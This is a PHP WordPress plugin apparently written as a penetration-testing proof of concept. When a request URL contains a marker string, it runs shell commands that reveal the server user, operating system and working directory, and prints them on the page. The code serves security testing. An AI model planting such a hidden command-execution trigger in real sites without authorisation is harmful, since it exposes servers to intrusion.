<?php
/**
* Plugin Name: My plugin
* Plugin URI:
* Version: 0.1
* Author: PTLearnerSec
* Comment : Dummy shell exec plugin PoC
*/


// Exit if accessed directly
if (!defined('ABSPATH')) {
    exit;
}

add_action('wp', 'trigger_reverse');

function trigger_reverse() {
    if (strpos($_SERVER['REQUEST_URI'], '{{randomString}}') !== false) {
        // Get the current OS
        $osType = PHP_OS_FAMILY;

        // Execute commands based on the OS
        if ($osType === 'Windows') {
            $whoami = shell_exec("powershell -c \"whoami\"");
            $currentOs = shell_exec("powershell -c \"Get-WmiObject Win32_OperatingSystem | Select-Object Caption, Version | Format-Table -HideTableHeaders\"");
            $currentPath = shell_exec("powershell -c \"Get-Location | Format-Table -HideTableHeaders\"");
        } elseif ($osType === 'Linux') {
            $whoami = shell_exec("whoami");
            $currentOs = shell_exec("uname -a");
            $currentPath = shell_exec("pwd");
        } else {
            die("Unsupported OS: " . PHP_OS_FAMILY . "\n");
        }

        echo("<div>");
        echo("<h3>Plugin is running</h3>");
        echo("<p><strong>User:</strong> {$whoami}</p>");
        echo("<p><strong>Operating System:</strong> {$currentOs}</p>");
        echo("<p><strong>Current path:</strong> {$currentPath}</p>");
        echo("</div>");
    }
}

?>